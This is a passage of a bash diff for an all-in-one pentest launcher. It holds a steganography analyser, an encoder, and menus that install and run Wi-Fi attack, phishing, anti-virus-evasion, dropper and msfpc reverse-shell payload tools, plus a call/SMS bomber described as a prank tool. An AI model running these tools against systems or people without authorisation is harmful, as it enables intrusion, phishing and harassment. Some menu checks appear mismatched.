+	elif [[ $SCAN_CHOICE == "0" ]]; then
+    	MainMenu
+	else
+    	log_message "Invalid choice. Please enter 1, 2, 3, 4, or 5."
+    	rscript_main
+	fi
+
+	log_message "Done."
+}
+change_target() {    
+    # Ask user if they want to change the target IP address
+    read -p "Do you want to change the target IP address? (yes/no): " choice
+    if [ "$choice" = "yes" ] || [ "$choice" = "YES" ] || [ "$choice" = "y" ] || [ "$choice" = "Y" ]; then
+        prompt_target_ip
+        rscript_main
+    elif [ "$choice" = "no" ] || [ "$choice" = "NO" ] || [ "$choice" = "n" ] || [ "$choice" = "N" ]; then
+        rscript_main
+    else
+        echo "Please answer yes or no."
+    fi
+}
+rscript_main
+}
+
+
+#Steganography file Extraction
+function stegano() {
+
+  # Function to log messages
+  log() {
+    echo "$1" | tee -a "$log_file"
+  }
+
+  # Function to validate the file
+  validate_file() {
+    if [ ! -f "$file" ]; then
+      echo "Error: File '$file' not found!"
+      exit 1
+    fi
+  }
+
+  # Function to prompt for file input if not provided
+  prompt_for_file() {
+    echo "Enter the path of the file to analyze (use Tab for auto-completion):"
+    read -e -p "> " file
+    validate_file
+  }
+
+  # Function to analyze with stegseek
+  analyze_stegseek() {
+    echo "=================================================================================="
+    log "Running stegseek..."
+    stegseek "$file" "$wordlist" -f -xf "${output_dir}/stegseek_output.txt" >> "$log_file"
+    
+    if [ $? -eq 0 ]; then
+      log "stegseek: Potential passphrase found."
+    else
+      log "stegseek: No passphrase found or extraction failed."
+    fi
+    echo "=================================================================================="
+  }
+
+  # Function to analyze with exiftool
+  analyze_exiftool() {
+  	echo
+    echo "=================================================================================="
+    log "Running exiftool..."
+    exiftool "$file" > "$output_dir/exiftool_output.txt" 2>> "$log_file"
+    log "exiftool: Metadata extraction complete. Check exiftool_output.txt."
+    echo "=================================================================================="
+    echo
+  }
+
+  # Function to analyze with binwalk
+  analyze_binwalk() {
+  	echo
+    echo "=================================================================================="
+    log "Running binwalk..."
+    binwalk -e --directory="$output_dir" "$file" 2>> "$log_file"
+    if [ $? -eq 0 ]; then
+      log "binwalk: Extraction complete. Check the $output_dir directory."
+    else
+      log "binwalk: No embedded files found."
+    fi
+    echo "=================================================================================="
+    echo
+  }
+
+  # Function to analyze with wavesteg
+  analyze_wavesteg() {
+  	echo
+    echo "=================================================================================="
+    if [[ "$file" == *.wav ]]; then
+      log "Running wavesteg..."
+      wavesteg -r "$file" -o "$output_dir/wavesteg_output" 2>> "$log_file"
+      if [ $? -eq 0 ]; then
+        log "wavesteg: Data extracted successfully."
+      else
+        log "wavesteg: No data found or extraction failed."
+      fi
+    else
+      log "wavesteg: Skipping (not a WAV file)."
+    fi
+    echo "=================================================================================="
+    echo 
+  }
+
+  # Function to analyze with stegolsb
+  analyze_stegolsb() {
+  	echo
+  	echo "=================================================================================="
+    if [[ "$file" == *.bmp || "$file" == *.png ]]; then
+      log "Running stegolsb..."
+      stegolsb steganalyze -i "$file" > "$output_dir/stegolsb_output.txt" 2>> "$log_file"
+      if [ $? -eq 0 ]; then
+        log "stegolsb: Analysis complete. Check stegolsb_output.txt."
+      else
+        log "stegolsb: Analysis failed or no hidden data found."
+      fi
+    else
+      log "stegolsb: Skipping (not a BMP or PNG file)."
+    fi
+    echo "=================================================================================="
+    echo
+  }
+  # Steg Main Function 
+Stego_main() {  
+  # Main script starts here
+  if [[ ! -d "$LPATH/StegoAnalysis" ]]; then				
+    mkdir "$LPATH/StegoAnalysis"
+  fi
+   
+  # Check if the file path is provided as an argument, otherwise prompt for it
+  if [ $# -ne 1 ]; then
+    prompt_for_file
+  else
+    file=$1
+    validate_file
+  fi
+  
+  sfile="${file##*/}"  # Extract filename with extension
+  sfile="${sfile%.*}"  # Remove extension
+
+  if [[ ! -d "$LPATH/StegoAnalysis/$sfile" ]]; then				
+    mkdir "$LPATH/StegoAnalysis/$sfile"
+  fi
+  
+  output_dir="$LPATH/StegoAnalysis/$sfile"
+  log_file="$output_dir/analysis.log"
+  wordlist="/usr/share/wordlists/rockyou.txt"
+
+  # Initialize log file
+  echo "Steganography Analysis Log - $(date)" > "$log_file"
+
+  log "Analyzing file: $file"
+
+  # Run all analyses
+  analyze_stegseek
+  analyze_exiftool
+  analyze_binwalk
+  analyze_wavesteg
+  analyze_stegolsb
+
+  log "Analysis complete. Check the $output_dir directory for results."
+  }
+Stego_main "$@"
+  }
+
+
+function ciphers() {
+    # Define the banner as multiple lines
+    banner_lines=(
+        "  ______  __          __                                  "
+        " /      \|  \        |  \                                 "
+        "|  ▓▓▓▓▓▓\\▓▓ ______ | ▓▓____   ______   ______   _______ "
+        "| ▓▓   \▓▓  \/      \| ▓▓    \ /      \ /      \ /       \\"
+        "| ▓▓     | ▓▓  ▓▓▓▓▓▓\ ▓▓▓▓▓▓▓\  ▓▓▓▓▓▓\  ▓▓▓▓▓▓\  ▓▓▓▓▓▓▓"
+        "| ▓▓   __| ▓▓ ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓    ▓▓ ▓▓   \▓▓\▓▓    \\"
+        "| ▓▓__/  \ ▓▓ ▓▓__/ ▓▓ ▓▓  | ▓▓ ▓▓▓▓▓▓▓▓ ▓▓      _\▓▓▓▓▓▓\\"
+        " \▓▓    ▓▓ ▓▓ ▓▓    ▓▓ ▓▓  | ▓▓\▓▓     \ ▓▓     |       ▓▓"
+        "  \▓▓▓▓▓▓ \▓▓ ▓▓▓▓▓▓▓ \▓▓   \▓▓ \▓▓▓▓▓▓▓\▓▓      \▓▓▓▓▓▓▓ "
+        "            | ▓▓                                           "
+        "            | ▓▓                                           "
+        "             \▓▓                                          "
+    )
+
+    # Function to display the banner and menu
+    display_banner_and_menu() {
+        clear
+        echo -e "${BG}"
+        for line in "${banner_lines[@]}"; do
+            echo -e "\t\t$line"
+        done
+        echo -e "${CE}"
+        echo
+        echo "Choose a method:"
+        echo "1. Base64"
+        echo "2. URL"
+        echo "3. Hex"
+        echo "4. Rot13"
+        echo "5. Exit"
+    }
+
+    # Function to display the action menu
+    display_action_menu() {
+        clear
+        echo -e "${BG}"
+        for line in "${banner_lines[@]}"; do
+            echo -e "\t\t$line"
+        done
+        echo -e "${CE}"
+        echo
+        echo "Choose an action:"
+        if [ "$method" = "rot13" ]; then
+            echo "1. Encode/Decode"
+        else
+            echo "1. Encode"
+            echo "2. Decode"
+        fi
+        echo "3. Back to main menu"
+    }
+
+    # Function for Base64 encoding
+    base64_encode() {
+        echo -e "${BR}$(echo -n "$1" | base64)${CE}"
+    }
+
+    # Function for Base64 decoding
+    base64_decode() {
+        echo -e "${BR}$(echo -n "$1" | base64 --decode)${CE}"
+    }
+
+    # Function for URL encoding
+    url_encode() {
+        echo -e "${BR}$(echo -n "$1" | jq -sRr @uri)${CE}"
+    }
+
+    # Function for URL decoding
+    url_decode() {
+        echo -e "${BR}$(echo -n "$1" | sed 's/%/\\x/g' | xargs -0 printf)${CE}"
+    }
+
+    # Function for Hex encoding
+    hex_encode() {
+        echo -e "${BR}$(echo -n "$1" | xxd -p)${CE}"
+    }
+
+    # Function for Hex decoding
+    hex_decode() {
+        echo -e "${BR}$(echo -n "$1" | xxd -r -p)${CE}"
+    }
+
+    # Function for Rot13 encoding/decoding
+    rot13() {
+        echo -e "${BR}$(echo -n "$1" | tr 'A-Za-z' 'N-ZA-Mn-za-m')${CE}"
+    }
+
+    # Function to display the main menu and handle choices
+    main_menu() {
+        while true; do
+            display_banner_and_menu
+            read -p "Enter the number of your choice: " method_choice
+
+            if [ "$method_choice" -eq 1 ]; then
+                method="base64"
+            elif [ "$method_choice" -eq 2 ]; then
+                method="url"
+            elif [ "$method_choice" -eq 3 ]; then
+                method="hex"
+            elif [ "$method_choice" -eq 4 ]; then
+                method="rot13"
+            elif [ "$method_choice" -eq 5 ]; then
+                echo "Exiting..."
+                MainMenu
+            else
+                echo "Invalid choice"
+                continue
+            fi
+
+            while true; do
+                display_action_menu
+                read -p "Enter the number of your choice: " action_choice
+
+                if [ "$action_choice" -eq 1 ]; then
+                    action="encode"
+                elif [ "$action_choice" -eq 2 ]; then
+                    action="decode"
+                elif [ "$action_choice" -eq 3 ]; then
+                    break
+                else
+                    echo "Invalid choice"
+                    continue
+                fi
+
+                # Prompt for input text
+                read -p "Enter the text: " text
+
+                # Perform the requested operation
+                if [ "$method" = "base64" ]; then
+                    if [ "$action" = "encode" ]; then
+                        base64_encode "$text"
+                    else
+                        base64_decode "$text"
+                    fi
+                elif [ "$method" = "url" ]; then
+                    if [ "$action" = "encode" ]; then
+                        url_encode "$text"
+                    else
+                        url_decode "$text"
+                    fi
+                elif [ "$method" = "hex" ]; then
+                    if [ "$action" = "encode" ]; then
+                        hex_encode "$text"
+                    else
+                        hex_decode "$text"
+                    fi
+                elif [ "$method" = "rot13" ]; then
+                    rot13 "$text"
+                else
+                    echo "Invalid method"
+                    break
+                fi
+
+                echo # Print a newline for readability
+                read -n 1 -s -r -p "Press any key to continue..."
+            done
+        done
+    }
+
+    # Call the main menu function
+    main_menu
+}
+
+function airgeddonn
+{
+if [[ -f "/bin/airgeddon" ]]
+then
+	airgeddon
+else
+	echo -e "$TNI"
+	read INSTALL
+	if [[ "$INSTALL" = "install" ]]
+	then
+	install_airgeddon
+	else
+		continue
+	fi
+fi
+
+}
+
+function wifi_tools
+{
+	while true
+	do
+	printf '\033]2;WIFI TOOLS\a'
+	clear
+	TERMINALTITLE="WIFI TOOLS"
+	dash_calc
+	if [[ -d /root/fluxion ]]
+	then
+		echo -e ""$BY" 1"$CE") Fluxion               The future of MITM WPA attacks"
+	else
+		echo -e ""$BR" 1"$CE") "$BR"Fluxion"$CE"               The future of MITM WPA attacks"
+	fi
+	if [[ $(which wifite) ]]
+	then
+		echo -e ""$BY" 2"$CE") Wifite                Automated wireless attack tool"
+	else
+		echo -e ""$BR" 2"$CE") "$BR"Wifite"$CE"               Automated wireless attack tool"
+	fi
+	if [[ -f /bin/wifiphisher ]]
+	then
+		echo -e ""$BY" 3"$CE") Wifiphisher           Automated phishing attacks against Wi-Fi clients"
+	else
+		echo -e ""$BR" 3"$CE") "$BR"Wifiphisher"$CE"           Automated phishing attacks against Wi-Fi clients"
+	fi
+	
+	if [[ -f "/bin/fern-wifi-cracker" ]]
+	then	
+		echo -e ""$BY"4"$CE") Fern                  Wifi cracker GUI"
+	else
+		echo -e ""$BR"4"$CE") "$BR"Fern"$CE"                  Wifi cracker GUI"
+	fi
+	if [[ -f /usr/sbin/netdiscover ]]
+	then	
+		echo -e ""$BY"5"$CE") Netdiscover           Network address discovering tool"
+	else
+		echo -e ""$BR"5"$CE") "$BR"Netdiscover"$CE"           Network address discovering tool"
+	fi
+	if [[ -d /root/kickthemout ]]
+	then	
+		echo -e ""$BY"6"$CE") KickThemOut           Kick devices off your network"
+	else
+		echo -e ""$BR"6"$CE") "$BR"KickThemOut"$CE"           Kick devices off your network"
+	fi
+	if [[ -f /usr/bin/airgeddon ]]
+	then
+		echo -e ""$BY"7"$CE") Airgeddon             Audit wireless networks."
+	else
+		echo -e ""$BR"7"$CE") "$BR"Airgeddon"$CE"             Audit wireless networks."
+	fi
+	if [[ -f /usr/bin/websploit ]]
+	then
+		echo -e ""$BY"8"$CE") Websploit             Advanced MITM framework"
+	else
+		echo -e ""$BR"8"$CE") "$BR"Websploit"$CE"             Advanced MITM framework"
+	fi
+	if [[ -f /usr/bin/routersploit ]]
+	then
+		echo -e ""$BY"9"$CE") Routersploit          Find/exploit router vulnerabilities"
+	else
+		echo -e ""$BR"9"$CE") "$BR"Routersploit"$CE"          Find/exploit router vulnerabilities"
+	fi
+	
+	echo -e ""$BY" b"$CE") Go back"
+	echo -e ""$BY"0"$CE") Main menu"
+	#echo -e ""$BY" 0"$CE") EXIT"
+	echo -e "Choose: "
+	read -e APPP
+	clear
+	if [[ "$APPP" = "1" ]]
+	then
+		if [[ -d /root/fluxion ]]
+		then
+			cd /root/fluxion
+			./fluxion*
+			cd
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_fluxion
+			else
+				continue
+			fi
+		fi
+	elif [[ "$APPP" = "2" ]]
+	then
+		if [[ $(which wifite) ]]
+		then
+			wifite
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_wifite
+			else
+				continue
+			fi
+		fi
+	elif [[ "$APPP" = "3" ]]
+	then
+		if [[ -f /bin/wifiphisher ]]
+		then
+			clear
+			wifiphisher
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_wifiphisher
+			else
+				continue
+			fi
+		fi
+	elif [[ "$APPP" = "4" ]]
+	then
+		if [[ -e "/bin//fern-wifi-cracker" ]]
+		then
+			fern-wifi-cracker
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_fern
+			else
+				continue
+			fi
+		fi
+	elif [[ "$APPP" = "5" ]]
+	then
+		if [[ -f /usr/sbin/netdiscover ]]
+		then
+			echo -e "Range ("$BY"Enter"$CE"=192.168.1.0/24):"
+			read NRANGE
+			if [[ -z $NRANGE ]]
+			then
+				NRANGE="192.168.1.0/24"
+			fi
+			netdiscover -r $NRANGE #-i "$WLANN"
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_netdiscover
+			else
+				continue
+			fi
+		fi
+	elif [[ "$APPP" = "6" ]]
+	then
+		if [[ -d "/root/kickthemout" ]]
+		then
+			cd /root/kickthemout
+			python kickthemout.py
+			cd
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_kickthemout
+			else
+				continue
+			fi
+		fi
+
+	elif [[ "$APPP" = "7" ]]
+	then
+		if [[ -f "/bin/airgeddon" ]]
+		then
+			airgeddon
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_airgeddon
+			else
+				continue
+			fi
+		fi
+	elif [[ "$APPP" = "8" ]]
+	then
+		if [[ -e "/bin/websploit" ]]
+		then
+			websploit
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_websploit
+			else
+				continue
+			fi
+		fi
+	elif [[ "$APPP" = "9" ]]
+	then
+		if [[ -e "/bin/routersploit" ]]
+		then
+        	routersploit
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_routersploit
+			else
+				continue
+			fi
+		fi
+	elif [[ "$APPP" = "b" ]]
+	then
+		tools_menu
+	elif [[ "$APPP" = "0" ]]
+	then
+		MainMenu
+	else
+		echo "Invalid option"
+		continue
+	fi
+	done
+
+}
+
+
+function tools_menu
+{
+	while true
+	do
+	clear
+	TERMINALTITLE="TOOLS"
+	dash_calc
+	printf '\033]2;TOOLS\a'
+	echo -e ""$BY" 1"$CE") Wifi tools"
+	echo -e ""$BY" 2"$CE") Remote access"
+	echo -e ""$BY" 3"$CE") Information gathering"
+	echo -e ""$BY" 4"$CE") Website tools"
+	echo -e ""$BY" 5"$CE") Others"
+	echo -e ""$BY" i"$CE") Info"
+	echo -e ""$BY" b"$CE") Go back"
+	echo -e ""$BY" 0"$CE") EXIT"
+	echo "Choose: "
+	read -e CATEG
+	clear
+		if [[ "$CATEG" = "1" ]]
+		then
+			wifi_tools
+		elif [[ "$CATEG" = "2" ]]
+		then
+			remote_access
+		elif [[ "$CATEG" = "3" ]]
+		then
+			information_gathering
+		elif [[ "$CATEG" = "4" ]]
+		then
+			website_tools
+		elif [[ "$CATEG" = "5" ]]
+		then
+			other_tools
+		elif [[ "$CATEG" = "0" ]]
+		then
+			clear
+			exit
+		elif [[ "$CATEG" = "back" || "$CATEG" = "b" ]]
+		then
+			MainMenu
+		elif [[ "$CATEG" = "i" ]]
+		then
+			TERMINALTITLE="INFO"
+			printf '\033]2;INFO\a'
+			echo -e ""$LGY"Wifi tools:"
+			echo -e "	Mostly focused on network attacks, MITM, DoS, evil-twin and phishing."
+			echo -e "Remote access:"
+			echo -e "	Mostly focused on payload generation, listeners, exploits, scanners"
+			echo -e "	and bypassing anti-virus software."
+			echo -e "Information gathering:"
+			echo -e "	Self-explained."
+			echo -e "Other tools:"
+			echo -e "	Some very usefull tools that don't fit to the other categories."
+			echo -e "Install/reinstall a tool:"
+			echo -e "	From here you can install any tool available in the lazy script."
+			echo -e "	If it is already installed, it will be deleted and reistalled."$CE""
+			echo -e ""
+			echo -e "$PAKTGB"
+			$READAK
+		fi
+	done
+}
+
+
+function remote_access
+{
+	while true 
+	do
+	clear
+	TERMINALTITLE="REMOTE ACCESS"
+	dash_calc
+	printf '\033]2;REMOTE ACCESS\a'
+	if [[ -d /root/ezsploit ]]
+	then
+		echo -e ""$BY" 1"$CE") Ezsploit              Automation for metasploit"
+	else
+		echo -e ""$BR" 1"$CE") "$BR"Ezsploit"$CE"              Automation for metasploit"
+	fi
+	if [[ -f /usr/bin/powershell-empire ]]
+	then
+		echo -e ""$BY" 2"$CE") Empire                PowerShell and Python post-exploitation agent"
+	else
+		echo -e ""$BR" 2"$CE") "$BR"Empire"$CE"                PowerShell and Python post-exploitation agent"
+	fi
+	if [[ -d /root/Veil ]]
+	then
+		echo -e ""$BY" 3"$CE") Veil-Framework        Generate payloads that bypass common anti-virus"
+	else
+		echo -e ""$BR" 3"$CE") "$BR"Veil-Framework"$CE"        Generate payloads that bypass common anti-virus"
+	fi
+	if [[ -f /usr/bin/shellter ]]
+	then
+		echo -e ""$BY" 4"$CE") Shellter              Inject payload into .exe"
+	else
+		echo -e ""$BR" 4"$CE") "$BR"Shellter"$CE"              Inject payload into .exe"
+	fi
+	if [[ -f /usr/bin/beef-xss ]]
+	then
+		echo -e ""$BY" 5"$CE") Beef                  The browser exploitation framework"
+	else
+		echo -e ""$BR" 5"$CE") "$BR"Beef"$CE"                   The browser exploitation framework"
+	fi
+	if [[ -f /usr/bin/koadic ]]
+	then
+		echo -e ""$BY" 6"$CE") Koadic                Windows post-exploitation rootkit"
+	else
+		echo -e ""$BR" 6"$CE") "$BR"Koadic"$CE"                Windows post-exploitation rootkit"
+	fi
+	if [[ -d /root/Dr0p1t-Framework ]]
+	then
+		echo -e ""$BY" 7"$CE") Dr0p1t-Framework      Create an advanced stealthy dropper"
+	else
+		echo -e ""$BR" 7"$CE") "$BR"Dr0p1t-Framework"$CE"      Create an advanced stealthy dropper"
+	fi
+	if [[ -f /usr/bin/msfpc ]]
+	then
+		echo -e ""$BY" 8"$CE") MSFPC                 MSFvenom Payload Creator"
+	else
+		echo -e ""$BR" 8"$CE") "$BR"MSFPC"$CE"                 MSFvenom Payload Creator"
+	fi
+	echo -e ""$BY"b"$CE") Go back"
+	echo -e ""$BY"0"$CE") Main menu"
+	echo -e "Choose: "
+	read -e KEYLOG
+	clear
+	if [[ "$KEYLOG" = "6" ]]
+	then
+		if [[ -f /usr/bin/koadic ]]
+		then
+			
+			koadic -h
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_koadic
+			else
+				continue
+			fi
+		fi
+	elif [[ "$KEYLOG" = "2" ]]
+	then
+		if [[ -f /usr/bin/powershell-empire ]]
+		then
+			echo "command: powershell-empire"
+			powershell-empire
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_empire
+			else
+				continue
+			fi
+		fi	
+
+	elif [[ "$KEYLOG" = "7" ]]
+	then
+		if [[ -d /root/Dr0p1t-Framework ]]
+		then
+			cd /root/Dr0p1t-Framework
+			./Dr0p1t.py
+			#dropit_automation
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_dropit_frmw
+			else
+				continue
+			fi
+		fi	
+	elif [[ "$KEYLOG" = "3" ]]
+	then
+		if [[ -d /root/Veil ]]
+		then
+			cd /root/Veil
+			./Veil.py
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_veil
+			else
+				continue
+			fi
+		fi
+
+	elif [[ "$KEYLOG" = "8" ]]
+	then
+		if [[ -f /usr/bin/msfpc ]]
+		then
+			while true
+			do
+				clear
+				echo -e ""$BY" 1"$CE") APK"
+				echo -e ""$BY" 2"$CE") ASP"
+				echo -e ""$BY" 3"$CE") ASPX"
+				echo -e ""$BY" 4"$CE") Bash [.sh]"
+				echo -e ""$BY" 5"$CE") Java [.jsp]"
+				echo -e ""$BY" 6"$CE") Linux [.elf]"
+				echo -e ""$BY" 7"$CE") OSX [.macho]"
+				echo -e ""$BY" 8"$CE") Perl [.pl]"
+				echo -e ""$BY" 9"$CE") PHP"
+				echo -e ""$BY"10"$CE") Powershell [.ps1]"
+				echo -e ""$BY"11"$CE") Python [.py]"
+				echo -e ""$BY"12"$CE") Tomcat [.war]"
+				echo -e ""$BY"13"$CE") Windows [.exe // .dll]"
+				echo -e ""$BY"ENTER"$CE") Windows [.exe // .dll]"
+				echo -e ""
+				echo -e "Choose: "	
+				read TYPE
+				if [[ "$TYPE" -le 13 && "$TYPE" -ge 1 ]]
+				then
+					if [[ "$TYPE" = 1 ]]
+					then
+						MTYPE="APK"
+					elif [[ "$TYPE" = 2 ]]
+					then
+						MTYPE="ASP"
+					elif [[ "$TYPE" = 3 ]]
+					then
+						MTYPE="ASPX"
+					elif [[ "$TYPE" = 4 ]]
+					then
+						MTYPE="bash"
+					elif [[ "$TYPE" = 5 ]]
+					then
+						MTYPE="java"
+					elif [[ "$TYPE" = 6 ]]
+					then
+						MTYPE="linux"
+					elif [[ "$TYPE" = 7 ]]
+					then
+						MTYPE="OSX"
+					elif [[ "$TYPE" = 8 ]]
+					then
+						MTYPE="perl"
+					elif [[ "$TYPE" = 9 ]]
+					then
+						MTYPE="PHP"
+					elif [[ "$TYPE" = 10 ]]
+					then
+						MTYPE="powershell"
+					elif [[ "$TYPE" = 11 ]]
+					then
+						MTYPE="python"		
+					elif [[ "$TYPE" = 12 ]]
+					then
+						MTYPE="tomcat"
+					elif [[ "$TYPE" = 13 ]]
+					then
+						MTYPE="windows"																																																															
+					fi
+				else
+					if [[ "$TYPE" = "" ]]
+					then
+						MTYPE="windows"
+					else
+						echo -e ""$BR"Wrong choise"$CE""
+						sleep 1
+						clear
+						continue
+					fi
+				fi
+				clear
+				echo -e "LHOST: "
+				read MLHOST
+				clear
+				echo -e "LPORT: "
+				read MLPORT
+				clear
+				echo -e ""$BY" 1"$CE") CMD                      Smaller size but less features"
+				echo -e ""$BY" 2"$CE") MSF                      Bigger size but more features"
+				echo -e ""$BY"ENTER"$CE") MSF"
+				echo -e "Choose: "
+				read CMDMSF
+				if [[ "$CMDMSF" = 1 ]]
+				then
+					MCMDMSF="CMD"
+				else
+					MCMDMSF="MSF"
+				fi
+				clear
+				echo -e ""$BY" 1"$CE") Bind"
+				echo -e ""$BY" 2"$CE") Reverse"
+				echo -e ""$BY"ENTER"$CE") Reverse"
+				echo -e "Choose: "
+				read BR
+				if [[ "$BR" = 1 ]]
+				then
+					MBR="BIND"
+				else
+					MBR="REVERSE"
+				fi
+				clear
+				echo -e ""$BY" 1"$CE") Staged"
+				echo -e ""$BY" 2"$CE") Stageless"
+				echo -e ""$BY"ENTER"$CE") Staged"
+				echo -e "Choose: "	
+				read SORS
+				if [[ "$SORS" = 2 ]]
+				then
+					MSORS="STAGELESS"
+				else
+					MSORS="STAGED"
+				fi
+				clear
+				echo -e ""$BY" 1"$CE") TCP"
+				echo -e ""$BY" 2"$CE") HTTP"
+				echo -e ""$BY" 3"$CE") HTTPS"
+				echo -e ""$BY" 4"$CE") FIND_PORT"
+				echo -e ""$BY"ENTER"$CE") TCP"
+				echo -e "Choose: "
+				read PRT
+				if [[ "$PRT" = 2 ]]
+				then
+					MPRT="HTTP"
+				elif [[ "$PRT" = 3 ]]
+				then
+					MPRT="HTTPS"
+				elif [[ "$PRT" = 4 ]]
+				then
+					MPRT="FIND_PORT"
+				else
+					MPRT="TCP"
+				fi
+				clear
+				msfpc $MTYPE $MLHOST $MLPORT $MCMDMSF $MBR $MSORS $MPRT
+				break
+			done
+		else	
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_msfpc
+			else
+				continue
+			fi
+		fi	
+
+	elif [[ "$KEYLOG" = "5" ]]
+	then
+		if [[ -f /usr/bin/beef-xss ]]
+		then
+			beef-xss
+		else	
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_beef
+			else
+				continue
+			fi
+		fi
+
+	elif [[ "$KEYLOG" = "4" ]]
+	then
+		if [[ -f /usr/bin/shellter ]]
+		then
+			shellter
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_shellter
+			else
+				continue
+			fi
+		fi
+	elif [[ "$KEYLOG" = "1" ]]
+	then
+		if [[ -d /root/ezsploit ]]
+		then
+			cd /root/ezsploit/
+			./ezsploit.sh
+			cd
+			echo -e "Go to metasploit menu to create a listener(Option "$BY"14"$CE")"
+			sleep 2
+			echo -e "Press "$BY"any key"$CE" to leave..."
+			$READAK
+			remote_access
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_ezsploit
+			else
+				continue
+			fi
+		fi
+
+	elif [[ "$KEYLOG" = "0" ]]
+	then
+		MainMenu
+	elif [[ "$KEYLOG" = "back" || "$KEYLOG" = "b" ]]
+	then
+		tools_menu
+	fi
+	echo -e "$PAKTGB"
+	$READAK
+	done
+}
+
+function information_gathering
+{
+	while true 
+	do
+		clear
+		TERMINALTITLE="INFORMATION GATHERING"
+		dash_calc
+		printf '\033]2;INFORMATION GATHERING\a'
+		if [[ -d /usr/share/sniper ]]
+		then
+			echo -e ""$BY" 1"$CE") Sniper                Automated Pentest Recon Scanner"
+		else
+			echo -e ""$BR" 1"$CE") "$BR"Sniper"$CE"                Automated Pentest Recon Scanner"
+		fi
+		if [[ -d /root/RED_HAWK ]]
+		then
+			echo -e ""$BY" 2"$CE") RED HAWK              All in one tool"
+		else
+			echo -e ""$BR" 2"$CE") "$BR"RED HAWK"$CE"              All in one tool"
+		fi
+		echo -e ""$BY"b"$CE") Go back"
+		echo -e ""$BY"0"$CE") Main menu"
+		echo -e "Choose: "
+		read INFOG
+		clear
+		if [[ "$INFOG" = 1 ]]
+		then
+			if [[ -d /usr/share/sniper ]]
+			then
+				echo -e "Enter the domain you want to scan: "
+				read DOMAIN
+				clear
+				sniper $DOMAIN
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_sniper
+				else
+					continue
+				fi
+			fi
+
+		elif [[ "$INFOG" = 2 ]]
+		then
+			if [[ -d /root/RED_HAWK ]]
+			then
+				cd /root/RED_HAWK
+				php rhawk.php
+				cd
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_redhawk
+				else
+					continue
+				fi
+
+			fi
+		elif [[ "$INFOG" = 0 ]]
+		then
+			MainMenu
+		elif [[ "$INFOG" = "back" || "$INFOG" = "b" ]]
+		then
+			tools_menu
+		fi
+		echo -e "$PAKTGB"
+		$READAK
+	done
+}
+
+function website_tools
+{
+	while true 
+	do
+		clear
+		TERMINALTITLE="WEBSITE TOOLS"
+		dash_calc
+		printf '\033]2;WEBSITE TOOLS\a'
+		if [[ -f /usr/bin/sqlmap ]]
+		then
+			echo -e ""$BY" 1"$CE") SQLmap                Automatic SQL injection and database takeover tool"
+		else
+			echo -e ""$BR" 1"$CE") "$BR"SQLmap"$CE"                Automatic SQL injection and database takeover tool"
+		fi
+		echo -e ""$BY"b"$CE") Go back"
+		echo -e ""$BY"0"$CE") Main menu"
+		echo -e "Choose: "
+		read WEB
+		clear
+		if [[ "$WEB" = 1 ]]
+		then
+			if [[ -f /usr/bin/sqlmap ]]
+			then
+				sqlmap_menu
+			else
+				echo -e "$TNI"
+				read INSTALL
+				if [[ "$INSTALL" = "install" ]]
+				then
+					install_sqlmap
+				else
+					continue
+				fi
+			fi
+		elif [[ "$WEB" = "" ]]
+		then
+			continue
+		elif [[ "$WEB" = 0 ]]
+		then
+			MainMenu
+		elif [[ "$WEB" = "back" || "$WEB" = "b" ]]
+		then
+			tools_menu
+		fi
+	done
+}
+
+function other_tools
+{
+while true
+do
+	printf '\033]2;OTHER TOOLS\a'
+	clear
+	TERMINALTITLE="OTHER TOOLS"
+	dash_calc
+	if [[ -d /root/cupp ]]
+	then
+		echo -e ""$YS" 1"$CE") Cupp             Make specific worldlists"
+	else
+		echo -e ""$RS" 1"$CE") "$RS"Cupp"$CE"             Make specific worldlists"
+	fi
+	if [[ -d /root/cupp ]]
+	then
+		echo -e ""$YS" 2"$CE") Bleachbit        Free up space"
+	else
+		echo -e ""$RS" 2"$CE") "$RS"Bleachbit"$CE"        Free up space"
+	fi
+	if [[ -d /root/Hash-Buster ]]
+	then
+		echo -e ""$YS" 3"$CE") XLR8 BOMBER      Call/SMS bomber (use only for prank) "
+	else
+		echo -e ""$RS" 3"$CE") "$RS"XLR8 BOMBER"$CE"      Call/SMS bomber (use only for prank)"
+	fi
+	echo -e ""$YS" b"$CE") Go back"
+	echo -e ""$YS" 0"$CE") EXIT"
+	echo -e "Choose: "
+	read -e OTHERT
+	clear
+	if [[ "$OTHERT" = "1" ]]
+	then
+		if [[ -d "/root/cupp" ]]
+		then
+			cd /root/cupp
+			python cupp.py -i
+			cd		
+			echo -e "$PAKTGB"
+			$READAK	
+		else
